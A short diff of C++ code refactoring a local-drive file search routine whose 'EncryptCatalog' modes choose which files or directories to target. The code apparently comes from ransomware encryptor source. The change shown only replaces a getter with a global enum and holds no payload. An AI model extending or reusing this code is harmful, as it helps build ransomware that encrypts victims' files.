@@ -235,7 +235,7 @@ STATIC VOID SearchFiles
 
 size_t pathsystem::StartLocalSearch(LIST<DRIVE_INFO>* DriveInfo, TCHAR* dir)
 {
-    if (global::GetnEncCat() == EncryptCatalog::FILE_CAT)
+    if (GLOBAL_ENUM.g_EncryptCat == EncryptCatalog::FILE_CAT)
     {
         TCHAR* name = NULL;
         TCHAR* path = NULL;
@@ -269,11 +269,11 @@ size_t pathsystem::StartLocalSearch(LIST<DRIVE_INFO>* DriveInfo, TCHAR* dir)
     SearchFiles(dir, DirectoryInfo, DriveInfo);
 
 
-    if (global::GetnEncCat() == EncryptCatalog::DIR_CAT)
+    if (GLOBAL_ENUM.g_EncryptCat == EncryptCatalog::DIR_CAT)
     {
 
     }
-    else if (global::GetnEncCat() == EncryptCatalog::INDIR_CAT)
+    else if (GLOBAL_ENUM.g_EncryptCat  == EncryptCatalog::INDIR_CAT)
     {
         PDIRECTORY_INFO dirs = NULL;
         REV_LIST_FOREACH(dirs, DirectoryInfo)
